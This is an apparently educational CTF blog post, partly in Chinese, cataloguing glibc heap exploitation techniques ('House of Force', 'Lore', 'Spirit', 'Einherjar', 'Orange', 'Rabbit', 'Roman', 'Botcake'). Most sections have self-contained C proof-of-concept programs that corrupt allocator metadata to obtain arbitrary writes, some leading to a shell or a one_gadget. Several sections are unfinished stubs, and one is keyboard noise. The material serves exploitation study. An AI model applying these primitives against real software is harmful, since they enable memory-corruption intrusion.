---
title: House of All in One
date: 2020-04-25 23:39:50
tags: [ctf, pwn]
---

`House-of-*` 是对堆漏洞利用的一系列技术，起源于一篇叫做 Malleus Maleficarum（也有一本中世纪的时候有关女巫的条约的书叫做[女巫之槌](https://en.wikipedia.org/wiki/Malleus_Maleficarum)）的文章。

<!-- more -->

# [Malleus Maleficarum](https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt)

## House of Prime (glibc-2.3.5)

TODO

([X86 EXPLOITATION 101: THIS IS THE FIRST WITCHY HOUSE](https://gbmaster.wordpress.com/2014/08/24/x86-exploitation-101-this-is-the-first-witchy-house/))

```cpp
void
_int_free(mstate av, Void_t* mem)
{
    mchunkptr       p;           /* chunk corresponding to mem */
    INTERNAL_SIZE_T size;        /* its size */
    mfastbinptr*    fb;          /* associated fastbin */
    ...

    p = mem2chunk(mem);
    size = chunksize(p);

    if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
        || __builtin_expect ((uintptr_t) p & MALLOC_ALIGN_MASK, 0))
    {
        errstr = "free(): invalid pointer";
      errout:
        malloc_printerr (check_action, errstr, mem);
        return;
    }
```

## House of Mind (glibc-2.3.5)

TODO

([X86 EXPLOITATION 101: “HOUSE OF MIND” – UNDEAD AND LOVING IT…](https://gbmaster.wordpress.com/2015/06/15/x86-exploitation-101-house-of-mind-undead-and-loving-it/))

```cpp
public_fREe(Void_t* mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (__malloc_ptr_t, __const __malloc_ptr_t) = __free_hook;
  if (hook != NULL) {
    (*hook)(mem, RETURN_ADDRESS (0));
    return;
  }

  if (mem == 0)                              /* free(0) has no effect */
    return;

  p = mem2chunk(mem);

#if HAVE_MMAP
  if (chunk_is_mmapped(p))                       /* release mmapped memory. */
  {
    munmap_chunk(p);
    return;
  }
#endif

  ar_ptr = arena_for_chunk(p);
#if THREAD_STATS
  if(!mutex_trylock(&ar_ptr->mutex))
    ++(ar_ptr->stat_lock_direct);
  else {
    (void)mutex_lock(&ar_ptr->mutex);
    ++(ar_ptr->stat_lock_wait);
  }
#else
  (void)mutex_lock(&ar_ptr->mutex);
#endif
  _int_free(ar_ptr, mem);
  (void)mutex_unlock(&ar_ptr->mutex);
}
```

## House of Force

Modify top chunk to control buffer.

([X86 EXPLOITATION 101: “HOUSE OF FORCE” – JEDI OVERFLOW](https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/))

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define offset1 0x601080 - 0x10 - 0x602020 - 0x10
#define offset2 0x7fffffffdf10 - 0x10 - 0x6014f0 - 0x10

char buf1[50] = "Original Buffer (bss).";

int main() {
    void *p, *q;
    char buf2[50] = "Original Buffer (stack).";
    p = malloc(0x18);
    *(uint64_t *)((uint64_t)p + 0x18) = -1; // Set top chunk's size = 0xffffffffffffffff
    malloc(offset1);
    q = malloc(0x48);
    puts(buf1);
    memset(q, 'X', strlen(buf1));
    puts(buf1);

    /*
    p = malloc(0x18);
    *(uint64_t *)((uint64_t)p + 0x18) = -1; // Set top chunk's size = 0xffffffffffffffff
    malloc(offset2);
    q = malloc(0x48);
    puts(buf2);
    memset(q, 'Y', strlen(buf2));
    puts(buf2);
    */
    exit(0);
}
```

## House of Lore

Use the mechanism of smallbin to control buffer. (maybe Smallbin Attack)

([X86 EXPLOITATION 101: “HOUSE OF LORE” – PEOPLE AND TRADITIONS](https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/))

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

void sh() {
    system("/bin/sh");
    exit(0);
}

int main() {
    void *p, *q, *r, *s, *t;
    char buf1[0x20], buf2[0x20];
    fprintf(stderr, "buf1 => %p\n", buf1);
    fprintf(stderr, "buf2 => %p\n", buf2);

    p = malloc(0x68);
    fprintf(stderr, "p = malloc(0x68) => %p\n", p);
    *(uint64_t *)((uint64_t)buf1 + 0x10) = (uint64_t)p - 0x10; // Set buf1's fd = p - 0x10
    *(uint64_t *)((uint64_t)buf1 + 0x18) = (uint64_t)buf2; // Set buf1's bk = buf2
    *(uint64_t *)((uint64_t)buf2 + 0x10) = (uint64_t)buf1; // Set buf2's fd = buf1

    q = malloc(0x408);
    fprintf(stderr, "q = malloc(0x408) => %p\n", q);
    free(p);
    r = malloc(0x508);
    fprintf(stderr, "r = malloc(0x508) => %p\n", r); // Trigger malloc_consolidate
    *(uint64_t *)((uint64_t)p + 0x8) = (uint64_t)buf1; // Set p's bk = buf1
    s = malloc(0x68);
    fprintf(stderr, "s = malloc(0x68) => %p\n", s); // Get p (The original Freed Chunk)
    t = malloc(0x68);
    fprintf(stderr, "t = malloc(0x68) => %p\n", t); // Allacte to Stack
    uint64_t sh_addr = (uint64_t)sh;
    memcpy(t + 0x48, &sh_addr, 8);
}
```

## House of Spirit

Free a fake chunk into fastbin. (Stack overflow)

([X86 EXPLOITATION 101: “HOUSE OF SPIRIT” – FRIENDLY STACK OVERFLOW](https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/))

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

char target[0x100];

int main() {
    void *p, *mem;
    fprintf(stderr, "Target => %p\n", target);
    p = malloc(0x58);
    mem = (uint64_t *)((uint64_t)target + 0x10); // Get fake chunk's mem
    fprintf(stderr, "fake chunk's mem => %p\n", mem);
    *(uint64_t *)((uint64_t)target + 0x8) = 0x61; // Set fake chunk's size = 0x61
    *(uint64_t *)((uint64_t)target + 0x68) = 0x41; // Set fake chunk's next chunk's size = 0x41
    free(p);
    free(mem);
    fprintf(stderr, "malloc(0x58) => %p\n", malloc(0x58));
    exit(0);
}
```

## House of Chaos

```
(&*^^&%$#%$#**_)+_(_)**(%%^##$@%^^*(%$&*%^$&%%^^&#!@^&_)^&...
```

# Later House

## [House of Einherjar](https://www.youtube.com/watch?v=tq3mPjsl-H0)

Mostly chunk overlapping. (Unlink, Off by One)

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

int main() {
    char *p, *q, *r, *s;
    p = malloc(0x208);
    q = malloc(0x18);
    r = malloc(0xf8);
    s = malloc(0x18);

    printf("Fake chunk => %p\n", p);
    *(uint64_t *)((uint64_t)p) = 0;
    *(uint64_t *)((uint64_t)p + 0x8) = 0x221; // Fake chunk's size
    // Bypass unlink
    *(uint64_t *)((uint64_t)p + 0x10) = p; // Fake chunk's fd
    *(uint64_t *)((uint64_t)p + 0x18) = p; // Fake chunk's bk

    printf("Off by One\n");
    *(uint64_t *)((uint64_t)q + 0x10) = 0x220; // prev_size
    *(uint8_t *)((uint64_t)q + 0x18) = '\x00'; // Off by One
    free(r); // unlink
    printf("malloc(0x310) => %p\n", malloc(0x318));
    return 0;
}
```

## [House of Orange](http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html)

Create a freed chunk without `free()` and attack with `_IO_FILE` structure. (Unsortedbin Attack)

```cpp
// glibc-2.23 version
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define _IO_list_all 0x3c5520
#define one_gadget 0xf1147

char fake_vtable[0xa8];

int main() {
    void *p;
    void *fake_file;
    p = malloc(0x18);
    *(uint64_t *)((uint64_t)p + 0x18) = 0xfe1; // Set top chunk's size = 0xfe1
    malloc(0x1000); // Trigger sysmalloc (free top chunk)
    p = malloc(0x500); // Get a unsortedbin-chunk
    uint64_t libc_base = (uint64_t)(*(uint64_t *)p) - 0x3c5188;
    fprintf(stderr, "leak libc => %p\n", libc_base);

    uint64_t unsorted_bin_chunk_addr = (uint64_t)p + 0x500;
    fake_file = unsorted_bin_chunk_addr;
    uint64_t IO_list_all_addr = libc_base + _IO_list_all;
    // Create fake file (also a fake smallbin)
    *(uint64_t *)((uint64_t)fake_file + 0x8) = 0x61; // _IO_read_ptr ; Set smallbin's size ; Fake _chain @ `&unsortedbin + 0x68`
    *(uint64_t *)((uint64_t)fake_file + 0x18) = IO_list_all_addr - 0x10; // _IO_read_base ; For Unsoredbin Attack
    // Bypass _IO_overflow_t
    *(uint64_t *)((uint64_t)fake_file + 0xc0) = 0; // _mode
    *(uint64_t *)((uint64_t)fake_file + 0x28) = 1; // _IO_write_ptr
    *(uint64_t *)((uint64_t)fake_file + 0x20) = 0; // _IO_write_base
    *(uint64_t *)((uint64_t)fake_file + 0xd8) = fake_vtable; // vtable

    uint64_t one_gadget_addr = libc_base + one_gadget;
    *(uint64_t *)((uint64_t)fake_vtable + 0x18) = one_gadget_addr; // __overflow
    malloc(1); // Trigger malloc_printerr
    exit(0);
}
```

## [House of Rabbit](https://github.com/shift-crops/House_of_Rabbit)

TODO

(recommend [P4nda's article](http://p4nda.top/2018/04/18/house-of-rabbit/))

```cpp
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

char target[0x50] = "Orignial Buffer.";
char buf[0x40];

int main() {
    void *p, *q;
    fprintf(stderr, "Target: %s\n", target);
    p = malloc(0xa00008);
    free(p);
    p = malloc(0xa00008);
    free(p);

    p = malloc(0x28);
    q = malloc(0x88);
    free(p);
    *(uint64_t *)((uint64_t)buf + 0x8) = 0x11; // Set Fake Chunk1's size = 0x11
    *(uint64_t *)((uint64_t)buf + 0x18) = -0xf; // Set Fake Chunk2's prev_size = 0xfffffffffffffff1
    *(uint64_t *)((uint64_t)p) = (uint64_t *)((uint64_t)buf + 0x10); // Set Fastbin Chunk's fd = Fake Chunk2
    free(q); // Trigger malloc_consolidate

    *(uint64_t *)((uint64_t)buf + 0x18) = 0xa00001; // Set Fake Chunk
    malloc(0xa00000);
    *(uint64_t *)((uint64_t)buf + 0x18) = -0xf; // Set Fake Chunk

    int offset = (uint64_t)&target - ((uint64_t)buf + 0x10) - 0x20;
    p = malloc(offset);
    fprintf(stderr, "p = malloc(offset) => %p\n", p);
    void *victim = malloc(0x18);
    strcpy(victim, "Hacked.");
    fprintf(stderr, "Target: %s\n", target);
    exit(0);
}
```

## [House of Roman](https://github.com/romanking98/House-Of-Roman)

Partial write to control PC. (Off by One, Fastbin Attack, Unsortedbin Attack, etc)

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define libc_base 0x7ffff7a0d000
#define __malloc_hook libc_base+0x3c4b10
#define one_gadget libc_base+0xf02a4

int main() {
    void *p, *q, *r, *s, *u, *v;
    p = malloc(0x18);
    q = malloc(0xc8);
    r = malloc(0x68);
    *(uint64_t *)((uint64_t)q + 0x68) = 0x61;
    free(q);
    q = malloc(0xc8); // Get Unsortedbin addr
    s = malloc(0x68);
    u = malloc(0x68); // For fixing Fastbin
    v = malloc(0x68); // For triggering malloc_printerr
    *(uint8_t *)((uint64_t)p + 0x18) = 0x71; // Off by One

    free(r);
    free(s);
    *(uint8_t *)((uint64_t)s) = 0x20; // Point s's fd to q
    *(uint16_t *)((uint64_t)q) = (__malloc_hook - 0x23) & 0xffff; // Point q's fd to `&__malloc_hook - 0x23`
    fprintf(stderr, "malloc(0x68) => %p\n", malloc(0x68));
    fprintf(stderr, "malloc(0x68) => %p\n", malloc(0x68));
    p = malloc(0x68); // Get the chunk @ `&__malloc_hook - 0x23`
    free(u);
    *(uint64_t *)((uint64_t)u) = 0; // Set Fastbin's fd = 0 to fix Fastbin

    q = malloc(0xc8);
    fprintf(stderr, "malloc(0x18) => %p\n", malloc(0x18));
    free(q);
    // Unsortedbin Attack
    *(uint16_t *)((uint64_t)q + 0x8) = (__malloc_hook - 0x10) & 0xffff; // Point q's bk to `&__malloc_hook - 0x10`
    fprintf(stderr, "malloc(0xc8) => %p\n", malloc(0xc8));
    // Partial Write one_gadget
    *(uint16_t *)((uint64_t)p + 0x13) = one_gadget & 0xffff;
    *(uint8_t *)((uint64_t)p+ 0x15) = (one_gadget >> 16) & 0xff;
    free(v);
    free(v); // Trigger malloc_printerr
    exit(0);
}
```

## [House of Botcake](https://raw.githubusercontent.com/shellphish/how2heap/master/glibc_2.26/house_of_botcake.c) (>= glibc-2.26)

Bypass double free restriction on tcache. (Double Free, Chunk Overlapping)

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

void *ptr[7];
char buf[0x20];

int main() {
    void *p;
    fprintf(stderr, "target => %p\n", buf);
    for (int i = 0; i < 7; i++) { // Fillup Tcache
        ptr[i] = malloc(0x108);
    }
    p = malloc(0x108);
    void *victim = malloc(0x108);
    malloc(0x18); // padding

    for (int i = 0; i < 7; i++) {
        free(ptr[i]);
    }
    free(victim); // Add to unsortedbin
    free(p); // Consolidate with victim

    malloc(0x108); // get a chunk from Tcache & put victim into Tcache
    free(victim); // Double free
    p = malloc(0x128);
    *(uint64_t *)((uint64_t)p + 0x110) = buf; // Overwrite victim's fd = buf
    malloc(0x108);
    p = malloc(0x108);
    fprintf(stderr, "p = malloc(0x108) => %p\n", p);
    exit(0);
}
```

## [House of Corrosion](https://github.com/CptGibbon/House-of-Corrosion)

TODO

# References

https://www.youtube.com/watch?v=dooN6X28daI
https://ctf-wiki.github.io/ctf-wiki/
https://github.com/shellphish/how2heap
https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/
